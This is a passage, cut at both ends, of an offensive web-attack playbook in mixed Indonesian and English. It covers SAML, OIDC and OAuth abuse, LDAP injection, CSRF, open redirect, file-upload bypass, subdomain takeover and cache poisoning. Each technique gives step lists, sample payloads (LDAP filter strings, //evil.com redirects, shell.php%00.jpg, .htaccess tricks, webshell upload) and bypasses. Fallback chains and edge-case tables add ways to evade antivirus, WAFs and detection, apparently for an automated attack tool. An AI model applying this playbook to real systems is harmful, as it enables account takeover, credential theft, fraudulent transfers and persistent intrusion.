   ├── Exfiltrate isi file atau SSRF
   └── Probe internal resources
   DETECTION: Disable external entity resolution
   BYPASS: Use parameter entity variant

4. saml_signature_bypass
   WHAT: Signature validation bypass via algorithm confusion
   HOW:
   ├── Cari endpoint SAML yang menerima unsigned assertions
   ├── Swap signing algorithm atau strip signature
   ├── Bypass verification pada service provider
   └── Kirim assertion yang sepenuhnya dikuasai attacker
   DETECTION: Enforce signature algorithm allowlist
   BYPASS: Use RSA-to-HMAC key confusion

5. saml_misconfig
   WHAT: Eksploitasi misconfiguration SAML (default cert, permissive parsing)
   HOW:
   ├── Test validators yang menerima multiple certificates
   ├── Eksploitasi default signing certificates yang diketahui
   ├── Abuse issuer confusion antar tenant
   └── Forge assertion dengan cert yang diterima
   DETECTION: Certificate trust configuration audit
   BYPASS: Use tenant sprawl confusion

6. saml_idp_attack
   WHAT: Identity provider attack terhadap alur plug-in SP-ke-IdP
   HOW:
   ├── Target endpoint dan admin console IdP
   ├── Abuse IdP-initiated SSO flows
   ├── Forge atau leak signing material IdP
   └── Mint valid assertions untuk impersonasi
   DETECTION: IdP signing key monitoring
   BYPASS: Use JIT provisioning abuse

OIDC (5):

1. oidc_redirect
   WHAT: Redirect URI manipulation untuk intercept OIDC code
   HOW:
   ├── Cari pola redirect_uri yang diizinkan
   ├── Register attacker redirect URI yang cocok dengan rule
   ├── Initiate OIDC authorization flow
   ├── Terima authorization code pada URI attacker
   └── Exchange code menjadi token (public flow)
   DETECTION: Strict exact redirect_uri validation
   BYPASS: Use base-URI confusion

2. oidc_token_leak
   WHAT: Token leakage via Referer header
   HOW:
   ├── Letakkan URL attacker pada halaman korban
   ├── Victim navigate dengan URL berisi code/token
   ├── Referer header membawa code/token ke attacker
   └── Attacker membaca token yang bocor
   DETECTION: Referrer-Policy enforcement
   BYPASS: Use fragment-based leak variant

3. oidc_state_bypass
   WHAT: State parameter bypass pada alur login OIDC
   HOW:
   ├── Remove atau nullify parameter state
   ├── Initiate login tanpa CSRF binding token
   ├── Paksa korban authenticate dengan nilai attacker
   └── Bind identitas korban ke session attacker
   DETECTION: Mandatory state validation
   BYPASS: Use PKCE-only session binding

4. oidc_nonce_bypass
   WHAT: Nonce validation bypass pada ID token replay
   HOW:
   ├── Capture ID token lalu strip atau swap nonce
   ├── Replay token pada relying party
   ├── Jika nonce tidak diverifikasi, impersonasi target
   └── Pertahankan session yang dipalsukan
   DETECTION: Rigorous nonce verification
   BYPASS: Use opaque token swap

5. oidc_mixup
   WHAT: OIDC mix-up attack dengan mengganti authorization server
   HOW:
   ├── Daftarkan attacker IdP sebagai issuer tambahan
   ├── Switch authorization flow korban ke attacker IdP
   ├── Terima code yang diterbitkan tenant attacker
   └── Gunakan code di RP korban dengan issuer confusion
   DETECTION: Strict iss (issuer) identification
   BYPASS: Use silent-authentication confusion

OAUTH (4):

1. oauth_code_steal
   WHAT: Pencurian OAuth authorization code via redirect atau XSS
   HOW:
   ├── Phish korban via client dengan redirect malicious
   ├── Curi authorization code
   ├── Exchange code sebelum expiry
   └── Akses resource korban dengan stolen token
   DETECTION: Code binding ke PKCE verifier
   BYPASS: Use device code flow abuse

2. oauth_token_forge
   WHAT: OAuth access token forgery via weak signing/key confusion
   HOW:
   ├── Test crafted token signature
   ├── Confuse RS256 ke HS256 symmetric key
   ├── Forge access token yang telah ditandatangani
   └── Akses protected API sebagai user arbitrer
   DETECTION: Algorithm allowlist enforcement pada RS
   BYPASS: Use none algorithm fallback

3. oauth_scope_escal
   WHAT: OAuth scope escalation via token augmentation
   HOW:
   ├── Dapatkan access token scope rendah
   ├── Coba refresh/request dengan scope lebih tinggi
   ├── Swap scope claim pada authorization server
   ├── Re-request scope terluas yang diperbolehkan
   └── Akses endpoint privileged
   DETECTION: Client scope consent validation
   BYPASS: Use dynamic scope injection

4. oauth_refresh_hijack
   WHAT: OAuth refresh token hijack dan abuse rotasi
   HOW:
   ├── Curi refresh token via storage XSS atau logs
   ├── Reuse refresh token untuk access token baru
   ├── Eksploitasi rotasi lemah (reuse tetap valid)
   └── Pertahankan token refresh pada session korban
   DETECTION: Refresh token rotation + reuse detection
   BYPASS: Use client credentials token capture

FALLBACK:
SAML XXE → Assertion Replay → Signature Bypass →
OAuth Code Steal → Token Forge → OIDC Redirect → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Strict SP signature validation   │ 1. Switch to IdP-initiated flow
                                  │ 2. Abuse JIT provisioning
                                  │ 3. Alert operator
Assertion replay detected         │ 1. Rotate NotBefore/audience
                                  │ 2. Reuse fresh assertion
                                  │ 3. Log partial success
Nonce/PKCE enforced               │ 1. Pre-generate token path
                                  │ 2. Use open redirect bypass
                                  │ 3. Fallback to code capture
Redirect URI exact-match          │ 1. Register attacker subdomain
                                  │ 2. Use open redirect chain
                                  │ 3. Alert operator
IdP validates issuer strictly     │ 1. Use ADFS tenant confusion
                                  │ 2. Exploit scope escalation
                                  │ 3. Alert operator
Signing key rotation              │ 1. Fallback to scope escalation
                                  │ 2. Use token replay window
                                  │ 3. Log partial success
```

---

### 30.4 LDAP Injection

```
LDAP_ATTACKS (6):

1. ldap_filter_inject
   WHAT: Filter injection (|(uid=*))(|(password=*)) untuk bypass autentikasi
   HOW:
   ├── Inject metacharacters ke field username/password
   ├── Craft filter yang mengubah logika bind (|(uid=*))(|(password=*))
   ├── Neutralize concatenation filter server-side
   └── Authenticate sebagai unintended binds atau bypass
   DETECTION: Input escaping dan filter whitelist
   BYPASS: Use trailing * wildcard variant

2. ldap_null_bind
   WHAT: Null bind authentication bypass LDAP
   HOW:
   ├── Submit bind request dengan DN/password kosong
   ├── Jika directory mengizinkan unauthenticated simple bind
   ├── Dapatkan directory-level anonymous access
   └── Enumerate atau baca directory entries
   DETECTION: Disable anonymous/guest binds
   BYPASS: Use EXTERNAL SASL mech bind

3. ldap_wildcard
   WHAT: LDAP wildcard injection untuk memperluas hasil filter
   HOW:
   ├── Inject * ke dalam search filters
   ├── Match semua entries untuk suatu atribut
   ├── Baca records yang tidak berwenang
   └── Bypass value scoping
   DETECTION: Filter input sanitization
   BYPASS: Use substring (a*) matching

4. ldap_boolean
   WHAT: Boolean-based blind LDAP injection
   HOW:
   ├── Inject boolean payloads ke dalam filter
   ├── Poll response untuk perbedaan true/false
   ├── Extract nilai atribut bit-by-bit
   └── Reconstruct sensitive directory data
   DETECTION: LDAP query logging dan anomaly detection
   BYPASS: Use logical OR chains

5. ldap_time_based
   WHAT: Time-based blind LDAP injection
   HOW:
   ├── Inject time-delay conditional filter
   ├── Buat data-dependent delay via attribute functions
   ├── Measure response latency
   └── Derive isi directory dari hasil timing
   DETECTION: Query latency monitoring
   BYPASS: Use boolean-based extraction

6. ldap_error_based
   WHAT: Error-based data extraction LDAP
   HOW:
   ├── Inject malformed-but-valid filters
   ├── Trigger server exceptions atau verbose errors
   ├── Extract data dari error messages
   └── Harvest attribute names dan values
   DETECTION: Disable error verbosity server-side
   BYPASS: Use server-side conversion errors

LDAP_ABUSE (4):

1. ldap_enum_user
   WHAT: User enumeration via anonymous bind atau filter LDAP
   HOW:
   ├── Bind anonymous atau dengan low-priv account
   ├── Query objectClass=user/posixAccount
   ├── Enumerate username dan attributes
   └── Feed daftar user ke password spray
   DETECTION: LDAP query logging
   BYPASS: Use SMB enumeration fallback

2. ldap_enum_group
   WHAT: Group enumeration termasuk nested membership
   HOW:
   ├── Query objectClass=group dengan member attributes
   ├── Expand nested group membership
   ├── Map privileged groups dan admin
   └── Target account berprivilege tinggi
   DETECTION: Sensitive attribute access logging
   BYPASS: Use token-based enumeration

3. ldap_enum_spn
   WHAT: SPN enumeration untuk Kerberoasting
   HOW:
   ├── Query account dengan servicePrincipalName
   ├── Request TGS-REP untuk SPN yang ditargetkan
   ├── Extract encrypted TGS tickets
   └── Crack password service account offline
   DETECTION: TGS request anomaly, LDAP SPN audit
   BYPASS: Use AS-REP roasting variant

4. ldap_dump_all
   WHAT: Full directory dump via akses LDAP yang diizinkan
   HOW:
   ├── Gunakan unrestricted anonymous atau high-priv bind
   ├── Dump seluruh directory tree
   ├── Extract credentials, ACLs, dan struktur
   └── Map seluruh directory untuk lateral movement
   DETECTION: Bulk LDAP export anomaly
   BYPASS: Use delta/partitioned queries

FALLBACK:
Filter Injection → Null Bind → Wildcard → Boolean →
Time-based → Error-based → User Enum → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
LDAP input escaped                │ 1. Switch to time-based extraction
                                  │ 2. Use null byte tricks
                                  │ 3. Alert operator
Null bind disabled                │ 1. Use low-priv valid bind
                                  │ 2. Enumerate via errors
                                  │ 3. Log partial success
Anonymous bind restricted         │ 1. Relay NTLM to LDAP signing endpoint
                                  │ 2. Use captured hashes
                                  │ 3. Continue enumeration
Blind environment, no output      │ 1. Shift to boolean inference
                                  │ 2. Use timing oracle
                                  │ 3. Rebuild query
Metacharacters filtered           │ 1. Use unicode normalization
                                  │ 2. Apply double-encoding
                                  │ 3. Alert operator
Directory export timeout          │ 1. Segment by OU/DN
                                  │ 2. Throttle queries
                                  │ 3. Reassemble dump
```

---

### 30.5 CSRF

```
CSRF_ATTACKS (6):

1. csrf_token_bypass
   WHAT: Anti-CSRF token bypass via leak atau validasi lemah
   HOW:
   ├── Identifikasi format dan penempatan token
   ├── Load token via XSS atau Referer leak
   ├── Submit action dengan stolen token
   └── Lakukan unauthorized state change
   DETECTION: Token double-submit validation
   BYPASS: Use token-less same-origin variant

2. csrf_referer_bypass
   WHAT: Referer validation bypass
   HOW:
   ├── Craft request dengan Referer kosong/missing
   ├── Gunakan Referrer-Policy no-referrer stripping
   ├── Bypass pemeriksaan asal Referer
   └── Submit forged state change
   DETECTION: Require exact Origin header
   BYPASS: Use cross-origin referer prefix trick

3. csrf_samesite_bypass
   WHAT: SameSite cookie bypass via top-level navigation atau CORS
   HOW:
   ├── Identifikasi SameSite=Lax dengan GET top-level
   ├── Trigger top-level navigation GET CSRF
   ├── Atau abuse SameSite=None+Secure misconfig
   └── Eksekusi state-changing cross-site request
   DETECTION: SameSite enforcement review
   BYPASS: Use form POST ke JSON endpoint

4. csrf_json
   WHAT: JSON-based CSRF via cross-site form atau JavaScript
   HOW:
   ├── Target JSON API yang menerima cross-origin
   ├── Gunakan text/plain content-type trick
   ├── Atau use fetch dengan CORS preflight bypass
   └── Submit JSON state change secara cross-site
   DETECTION: Content-type validation + CSRF token
   BYPASS: Use form-encoded endpoint fallback

5. csrf_xml
   WHAT: XML-based CSRF via cross-site body
   HOW:
   ├── Target endpoint SOAP/XML
   ├── Craft cross-site XML request dengan form atau fetch
   ├── Jika content-type/boundary longgar, request tereksekusi
   └── Ubah state server
   DETECTION: XML parser content-type enforcement
   BYPASS: Use SOAPAction header trick

6. csrf_flash
   WHAT: Flash-based CSRF (legacy cross-domain request bypass)
   HOW:
   ├── Abuse crossdomain.xml misconfiguration
   ├── Gunakan ActionScript untuk mengirim forged requests
   ├── Baca response lintas domain
   └── Lakukan authenticated state changes
   DETECTION: Remove Flash, restrict crossdomain.xml
   BYPASS: Use alternate browser plugin vectors

CSRF_EXPLOIT (4):

1. csrf_admin_change
   WHAT: Admin action hijacking via CSRF
   HOW:
   ├── Trigger endpoint privileged via CSRF
   ├── Ubah setting atau role admin
   ├── Nonaktifkan security controls
   └── Pertahankan persistent access
   DETECTION: Admin action logging
   BYPASS: Use alternate method

2. csrf_password
   WHAT: Password change hijacking via CSRF
   HOW:
   ├── Forge password change request
   ├── Submit pada session korban
   ├── Overwrite password akun
   └── Login sebagai korban
   DETECTION: Password change CSRF token
   BYPASS: Use current-password revalidation

3. csrf_email
   WHAT: Email change hijacking menuju account takeover
   HOW:
   ├── Forge email-update request
   ├── Set email attacker
   ├── Trigger password reset
   └── Take over akun korban
   DETECTION: Email change confirmation
   BYPASS: Use profile field CSRF

4. csrf_transfer
   WHAT: Fund/transaction transfer hijacking via CSRF
   HOW:
   ├── Forge transfer request
   ├── Sertakan amount/destination pada request
   ├── Eksekusi unauthorized transfer
   └── Cover trail via transaction history flood
   DETECTION: Transfer re-authentication
   BYPASS: Use alternate method

FALLBACK:
Token Bypass → Referer Bypass → SameSite Bypass →
JSON CSRF → Flash CSRF → Direct Action → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Token bound to session            │ 1. Fallback to SameSite bypass
                                  │ 2. Use top-level navigation
                                  │ 3. Alert operator
Referer checks require origin     │ 1. Strip Referer policy
                                  │ 2. Mismatch Origin header
                                  │ 3. Fallback to JSON CSRF
SameSite=Lax enforced             │ 1. Use top-level GET CSRF
                                  │ 2. Trigger subdomain popup
                                  │ 3. Alert operator
JSON endpoint strict content-type │ 1. Use form-urlencoded fallback
                                  │ 2. Compatible JSON converter
                                  │ 3. Log partial success
Flash-based vector deprecated     │ 1. Switch to fetch/CORS CSRF
                                  │ 2. Use plugin alternative
                                  │ 3. Alert operator
Action requires confirmation      │ 1. Chain CSRF with XSS
                                  │ 2. Add click-injection layer
                                  │ 3. Alert operator
```

---

### 30.6 Open Redirect

```
REDIRECT_ATTACKS (5):

1. REDIRECT_PARAM
   WHAT: Parameter manipulation (next, url, redirect)
   HOW:
   ├── Identify redirect parameter (next, url, redirect, return)
   ├── Inject external URL ke parameter value
   ├── Test GET/POST variations
   ├── Confirm redirect via response 302/301
   └── Verify destination ke attacker domain
   DETECTION: Redirect parameter monitoring
   BYPASS: Use alternate encoding

2. REDIRECT_DOUBLE
   WHAT: Double URL encoding bypass
   HOW:
   ├── Identify redirect parameter
   ├── Apply double URL encoding ke payload (e.g., %252f%252f)
   ├── Submit encoded redirect
   ├── Bypass single-decode filter
   └── Confirm redirect ke external domain
   DETECTION: Double encoding detection
   BYPASS: Use triple encoding or mixed case

3. REDIRECT_PROTOCOL
   WHAT: Protocol-relative redirect (//evil.com)
   HOW:
   ├── Identify redirect parameter
   ├── Inject protocol-relative URL (//evil.com)
   ├── Browser resolves ke current protocol
   ├── Bypass http/https validation filter
   └── Confirm redirect ke attacker domain
   DETECTION: Protocol-relative URL monitoring
   BYPASS: Use URL with port number

4. REDIRECT_BACKSLASH
   WHAT: Backslash bypass (/\/evil.com)
   HOW:
   ├── Identify redirect parameter
   ├── Inject backslash pattern (/\/evil.com)
   ├── Server normalizes ke valid URL
   ├── Bypass path-based redirect validation
   └── Confirm redirect ke external domain
   DETECTION: Backslash pattern detection
   BYPASS: Use forward slash variations

5. REDIRECT_UNICODE
   WHAT: Unicode/IDN homograph bypass
   HOW:
   ├── Identify redirect parameter
   ├── Use Unicode-encoded domain (e.g., %C0%AF for /)
   ├── Inject IDN homograph domain
   ├── Server fails to decode properly
   └── Confirm redirect ke attacker domain
   DETECTION: Unicode normalization monitoring
   BYPASS: Use mixed encoding

REDIRECT_EXPLOIT (4):

1. REDIRECT_PHISH
   WHAT: Phishing via trusted domain redirect
   HOW:
   ├── Craft redirect URL on trusted domain
   ├── Set final destination ke phishing page
   ├── Send crafted link ke victim
   ├── Victim trusts trusted domain
   └── Victim enters credentials ke phishing page
   DETECTION: Redirect chain analysis
   BYPASS: Use intermediate redirect

2. REDIRECT_OAUTH
   WHAT: OAuth code theft via redirect
   HOW:
   ├── Identify OAuth callback parameter
   ├── Inject attacker-controlled redirect_uri
   ├── Victim initiates OAuth flow
   ├── Auth code redirected ke attacker
   └── Attacker exchanges code ke access token
   DETECTION: OAuth redirect_uri validation
   BYPASS: Use URL path traversal

3. REDIRECT_TOKEN
   WHAT: Token leakage via redirect
   HOW:
   ├── Identify parameter that passes token via redirect
   ├── Craft URL that redirects ke external domain
   ├── Victim clicks link
   ├── Token appended ke redirect URL
   └── Attacker captures token dari URL
   DETECTION: Token in URL parameter monitoring
   BYPASS: Use fragment-based leakage

4. REDIRECT_CORS
   WHAT: CORS misconfiguration via redirect
   HOW:
   ├── Identify open redirect vulnerability
   ├── Use redirect ke bypass CORS origin check
   ├── Craft cross-origin request via redirect
   ├── Bypass same-origin policy
   └── Exfiltrate sensitive data
   DETECTION: CORS redirect bypass monitoring
   BYPASS: Use cached redirect

FALLBACK:
Param Manip → Double Encode → Protocol-relative →
Backslash → Unicode → Direct Phish → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Redirect target blocks external   │ 1. Try alternative encoding
URL                               │ 2. Use open proxy on redirect
                                  │ 3. Use data URI scheme
Server validates whitelist on     │ 1. Try subdomain of whitelisted
whitelist domains                 │ 2. Find open redirect on whitelisted domain
                                  │ 3. Use mobile redirect variant
Redirect triggers WAF alert      │ 1. Use single-char encoding
                                  │ 2. Delay redirect with JavaScript
OAuth provider blocks custom      │ 1. Use registered subdomain trick
redirect_uri                      │ 2. Exploit post-redirect parameter
                                  │ 3. Use implicit flow
Unicode normalization filter      │ 1. Use different Unicode encoding
active                            │ 2. Use homoglyph characters
                                  │ 3. Combine with protocol-relative
Double encoding gets re-encoded   │ 1. Use triple encoding
by framework                      │ 2. Use character substitution
                                  │ 3. Try raw bytes
```

---

### 30.7 File Upload Bypass

```
UPLOAD_BYPASS (8):

1. EXT_BYPASS
   WHAT: Extension blacklist bypass (pHp5, .php.)
   HOW:
   ├── Enumerate server extension blacklist
   ├── Try alternative extensions (pHp5, php7, php_)
   ├── Use trailing dot/space (shell.php.)
   ├── Submit file via multipart upload
   └── Confirm execution via web access
   DETECTION: Extension whitelist enforcement
   BYPASS: Use double extension

2. CONTENT_TYPE_BYPASS
   WHAT: Content-Type header manipulation
   HOW:
   ├── Intercept file upload request
   ├── Change Content-Type ke image/jpeg
   ├── Set filename ke .php
   ├── Submit modified request
   └── Confirm file saved dan execution
   DETECTION: Content-Type validation
   BYPASS: Use magic bytes spoofing

3. MAGIC_BYTES_BYPASS
   WHAT: Magic bytes spoofing
   HOW:
   ├── Prepend valid magic bytes ke file (e.g., GIF89a)
   ├── Append PHP payload after magic bytes
   ├── Keep Content-Type as image/gif
   ├── Submit file via upload form
   └── Confirm PHP execution
   DETECTION: Magic bytes + extension consistency check
   BYPASS: Use double extension

4. DOUBLE_EXT
   WHAT: Double extension (shell.php.jpg)
   HOW:
   ├── Craft filename shell.php.jpg
   ├── Set Content-Type ke image/jpeg
   ├── Upload file via form
   ├── Server may process ke PHP due to misconfiguration
   └── Access file with .php extension for execution
   DETECTION: Double extension detection
   BYPASS: Use null byte injection

5. NULL_BYTE
   WHAT: Null byte injection (shell.php%00.jpg)
   HOW:
   ├── Craft filename shell.php%00.jpg
   ├── Upload file via form
   ├── Server truncates filename at null byte
   ├── File saved as shell.php
   └── Confirm PHP execution
   DETECTION: Null byte filtering
   BYPASS: Use path traversal

6. CASE_VARIATION
   WHAT: Case variation (shell.pHp)
   HOW:
   ├── Enumerate extension validation case-sensitivity
   ├── Use mixed case (shell.pHp, shell.Php)
   ├── Upload via form
   ├── Server accepts due to case-insensitive check
   └── Confirm execution on case-insensitive filesystem
   DETECTION: Case-insensitive extension validation
   BYPASS: Use URL encoding

7. PATH_TRAVERSAL
   WHAT: Path traversal in filename
   HOW:
   ├── Craft filename with path traversal (../../../shell.php)
   ├── Upload via form with filename parameter
   ├── File written ke parent directory
   ├── Bypass upload directory restriction
   └── Access file ke execute
   DETECTION: Filename path traversal check
   BYPASS: Use absolute path

8. POLYGLOT
   WHAT: Polyglot file (valid image + PHP)
   HOW:
   ├── Create valid JPEG file with PHP payload
   ├── Embed PHP code ke JPEG comment section
   ├── Upload as image file
   ├── Image processed by server as valid image
   └── Access via LFI ke execute PHP code
   DETECTION: Polyglot file analysis
   BYPASS: Use SVG with embedded code

UPLOAD_EXPLOIT (4):

1. WEBSHELL
   WHAT: PHP/ASP/JSP webshell upload
   HOW:
   ├── Create webshell payload (cmd, reverse shell)
   ├── Bypass upload validation (see UPLOAD_BYPASS)
   ├── Upload shell ke server
   ├── Access shell via web URL
   └── Execute commands remotely
   DETECTION: Webshell signature detection
   BYPASS: Use encrypted webshell

2. HTACCESS_UPLOAD
   WHAT: .htaccess file upload
   HOW:
   ├── Create .htaccess with AddType application/x-httpd-php
   ├── Bypass extension filter (no extension check)
   ├── Upload .htaccess ke web root
   ├── Server now parses .jpg ke PHP
   └── Upload PHP shell disguised as image
   DETECTION: .htaccess upload monitoring
   BYPASS: Use user.ini alternative

3. SVG_XSS
   WHAT: SVG with embedded XSS
   HOW:
   ├── Craft SVG file with embedded JavaScript
   ├── Use onload event ke trigger script
   ├── Upload SVG via file upload
   ├── SVG served as image but executes JavaScript
   └── Steal cookies/credentials
   DETECTION: SVG content sanitization
   BYPASS: Use CSS-based XSS

4. PDF_JS
   WHAT: PDF with embedded JavaScript
   HOW:
   ├── Create PDF with embedded JavaScript
   ├── Use /JS or /JavaScript action
   ├── Upload PDF via form
   ├── PDF renders ke user triggers script
   └── Redirect ke phishing or steal data
   DETECTION: PDF JavaScript detection
   BYPASS: Use embedded Flash (legacy)

FALLBACK:
Ext Bypass → Content-Type Bypass → Magic Bytes →
Double Extension → Null Byte → Path Traversal →
Polyglot → Direct Upload → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Server uses content-based file    │ 1. Create valid polyglot file
inspection (not just extension)   │ 2. Embed payload ke valid file metadata
                                  │ 3. Use LFI to trigger uploaded file
Upload directory is not web-      │ 1. Use path traversal to reach web root
accessible                        │ 2. Find alternate upload destination
                                  │ 3. Chain with LFI vulnerability
File system is case-sensitive     │ 1. Use exact extension case
                                  │ 2. Try uppercase extension
                                  │ 3. Use double extension
Anti-virus quarantines uploaded   │ 1. Obfuscate payload with base64
file                              │ 2. Split payload across multiple files
                                  │ 3. Use non-standard encoding
Upload rejects files > certain    │ 1. Compress file ke fit limit
size                              │ 2. Use chunked upload if supported
                                  │ 3. Embed small payload only
Server rewrites extension on      │ 1. Use double extension (shell.php.jpg)
save                              │ 2. Exploit path traversal
                                  │ 3. Use content-type confusion
```

---

### 30.8 Subdomain Takeover

```
TAKEOVER_METHODS (6):

1. DANGLING_CNAME
   WHAT: CNAME to decommissioned service
   HOW:
   ├── Enumerate subdomains ke target
   ├── Query DNS for CNAME records
   ├── Identify CNAME pointing ke decommissioned service
   ├── Verify claimable (no page/claim error)
   └── Claim subdomain ke attacker's service account
   DETECTION: CNAME record monitoring
   BYPASS: Use A record takeover

2. DANGLING_A
   WHAT: A record to decommissioned IP
   HOW:
   ├── Enumerate subdomains via DNS bruteforce
   ├── Identify A records pointing ke stale IPs
   ├── Verify IP hosts unclaimed service
   ├── Register account ke claim service
   └── Point attacker-controlled content
   DETECTION: A record stale IP monitoring
   BYPASS: Use NS record takeover

3. DANGLING_NS
   WHAT: NS record delegation
   HOW:
   ├── Enumerate NS records ke target subdomains
   ├── Identify NS delegated ke decommissioned DNS provider
   ├── Register NS records on attacker-controlled DNS
   ├── Resolve subdomain ke attacker IP
   └── Host malicious content
   DETECTION: NS delegation monitoring
   BYPASS: Use CNAME takeover

4. AZURE_TAKEOVER
   WHAT: Azure App Service takeover
   HOW:
   ├── Identify *.azurewebsites.net CNAME
   ├── Verify Azure subscription expired/removed
   ├── Create Azure account ke same region
   ├── Create App Service with matching name
   └── Content served from subdomain
   DETECTION: Azure resource ownership verification
   BYPASS: Use Azure CDN takeover

5. AWS_TAKEOVER
   WHAT: AWS S3/CloudFront takeover
   HOW:
   ├── Identify *.s3.amazonaws.com CNAME
   ├── Verify S3 bucket deleted/not claimed
   ├── Create S3 bucket with exact name
   ├── Upload malicious content
   └── Subdomain serves attacker content
   DETECTION: S3 bucket ownership verification
   BYPASS: Use CloudFront distribution takeover

6. GCP_TAKEOVER
   WHAT: GCP Storage/Load Balancer takeover
   HOW:
   ├── Identify *.storage.googleapis.com CNAME
   ├── Verify GCS bucket deleted
   ├── Create GCS bucket with matching name
   ├── Upload attacker-controlled content
   └── Subdomain serves malicious page
   DETECTION: GCS bucket ownership verification
   BYPASS: Use GCP Load Balancer takeover

TAKEOVER_TARGETS (8):

1. GITHUB_PAGES
   WHAT: github.io CNAME takeover
   HOW:
   ├── Identify subdomain CNAME ke *.github.io
   ├── Create GitHub Pages repository
   ├── Configure CNAME file ke target subdomain
   ├── Deploy attacker content
   └── Subdomain serves attacker page
   DETECTION: GitHub Pages ownership check
   BYPASS: Use alternate hosting

2. HEROKU
   WHAT: herokuapp.com takeover
   HOW:
   ├── Identify *.herokuapp.com CNAME
   ├── Create Heroku app with matching name
   ├── Deploy malicious application
   ├── Content served from target subdomain
   └── Harvest credentials via phishing
   DETECTION: Heroku app claim monitoring
   BYPASS: Use Vercel alternative

3. SHOPIFY
   WHAT: myshopify.com takeover
   HOW:
   ├── Identify *.myshopify.com CNAME
   ├── Register Shopify store ke same name
   ├── Configure domain ke attacker's Shopify
   ├── Serve phishing page ke shop
   └── Harvest payment/credential data
   DETECTION: Shopify store verification
   BYPASS: Use custom storefront

4. FASTLY
   WHAT: fastly.net takeover
   HOW:
   ├── Identify *.fastly.net CNAME
   ├── Verify previous Fastly account removed
   ├── Create Fastly account ke claim service
   ├── Configure edge server ke serve content
   └── Subdomain hijacked
   DETECTION: Fastly service monitoring
   BYPASS: Use Cloudflare alternative

5. PANTHEON
   WHAT: pantheonsite.io takeover
   HOW:
   ├── Identify *.pantheonsite.io CNAME
   ├── Create Pantheon account ke claim site
   ├── Deploy attacker-controlled CMS
   ├── Subdomain serves malicious content
   └── Harvest user data
   DETECTION: Pantheon site verification
   BYPASS: Use alternate CMS hosting

6. SURGE
   WHAT: surge.sh takeover
   HOW:
   ├── Identify *.surge.sh CNAME
   ├── Deploy ke Surge with matching subdomain
   ├── Upload attacker-controlled static site
   ├── Subdomain resolves ke attacker page
   └── Deliver phishing or malware
   DETECTION: Surge deployment monitoring
   BYPASS: Use Netlify alternative

7. CLOUDFRONT
   WHAT: *.cloudfront.net takeover
   HOW:
   ├── Identify *.cloudfront.net CNAME
   ├── Verify CloudFront distribution deleted
   ├── Create CloudFront distribution ke same domain
   ├── Configure origin ke attacker server
   └── Subdomain serves attacker content
   DETECTION: CloudFront distribution monitoring
   BYPASS: Use alternate CDN

8. AZURE
   WHAT: *.azurewebsites.net takeover
   HOW:
   ├── Identify *.azurewebsites.net CNAME
   ├── Verify Azure web app removed
   ├── Create Azure web app ke same name
   ├── Deploy malicious web application
   └── Subdomain hijacked
   DETECTION: Azure web app verification
   BYPASS: Use Azure Functions

FALLBACK:
CNAME Check → A Record Check → NS Check →
Azure Enum → AWS Enum → GCP Enum → Takeover → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Service provider validates domain │ 1. Use provider that does not validate
ownership on claim                │ 2. Find alternate unclaimed provider
                                  │ 3. Chain with DNS vulnerability
CNAME points ke active service    │ 1. Wait for service decommissioning
                                  │ 2. Check for expired SSL certs
                                  │ 3. Try alternate subdomains
Target has backup CNAME records   │ 1. Enumerate all DNS records
                                  │ 2. Check for wildcard records
                                  │ 3. Try NS delegation takeover
Cloud provider enforces name      │ 1. Use exact character match
reservation                       │ 2. Try with hyphens/numbers
                                  │ 3. Check provider name policies
Subdomain takeover triggers       │ 1. Use stealth approach with no visible
immediate detection               │ 2. Serve minimal payload first
                                  │ 3. Wait before exploitation
Target subdomain has SSL pinning  │ 1. Use provider-issued certificate
                                  │ 2. Exploit via HTTP only
                                  │ 3. Target mixed-content subdomains
```

---

### 30.9 Web Cache Poisoning

```
CACHE_POISONING (6):

1. UNKEYED_HEADER
   WHAT: X-Forwarded-Host, X-Original-URL poisoning
   HOW:
   ├── Identify unkeyed headers (X-Forwarded-Host)
   ├── Craft request with malicious header value
   ├── Back-end processes header for response generation
   ├── Cache stores poisoned response
   └── Victims served malicious cached content
   DETECTION: Unkeyed header validation
   BYPASS: Use alternate header

2. UNKEYED_COOKIE
   WHAT: Cookie-based cache poisoning
   HOW:
   ├── Identify cookies not included ke cache key
   ├── Craft request with malicious cookie value
   ├── Application reflects cookie ke cached response
   ├── Cache stores poisoned response
   └── Victims receive poisoned page
   DETECTION: Cookie cache key inclusion
   BYPASS: Use session-based poisoning

3. FAT_GET
   WHAT: GET request with body (fat GET)
   HOW:
   ├── Send GET request with body containing payload
   ├── Back-end processes body ke generate response
   ├── Cache key based on URL only (no body)
   ├── Poisoned response cached for GET URL
   └── Victims served malicious content
   DETECTION: GET body processing detection
   BYPASS: Use POST with cache header

4. PARAMETER_CLOAKING
   WHAT: Parameter cloaking via delimiter
   HOW:
   ├── Identify parameter delimiter (e.g., #, ?)
   ├── Craft URL with cloaked parameter (page?#param=value)
   ├── Back-end parses parameter, frontend ignores
   ├── Response generated with hidden parameter
   └── Poisoned cache entry created
   DETECTION: Parameter delimiter validation
   BYPATH: Use fragment-based cloaking

5. CACHE_DECEPTION
   WHAT: Cache deception (path confusion)
   HOW:
   ├── Identify cacheable path patterns
   ├── Craft URL with deceptive path (/account.js)
   ├── Back-end ignores extension, serves dynamic content
   ├── Cache stores dynamic response under static path
   └── Victims receive poisoned cached page
   DETECTION: Path confusion detection
   BYPASS: Use URL rewrite tricks

6. KEY_INJECTION
   WHAT: Cache key injection
   HOW:
   ├── Identify cache key derivation logic
   ├── Inject extra characters ke affect key generation
   ├── Craft URL that generates different cache key
   ├── Bypass cache segmentation
   └── Poison specific cache segment
   DETECTION: Cache key injection monitoring
   BYPASS: Use encoding variations

CACHE_EXPLOIT (4):

1. XSS_CACHE
   WHAT: Stored XSS via cache
   HOW:
   ├── Poison cache with XSS payload
   ├── Payload embedded in cached response
   ├── All users served cached version
   ├── XSS executes in victim browsers
   └── Steal cookies/credentials
   DETECTION: Cached XSS signature scanning
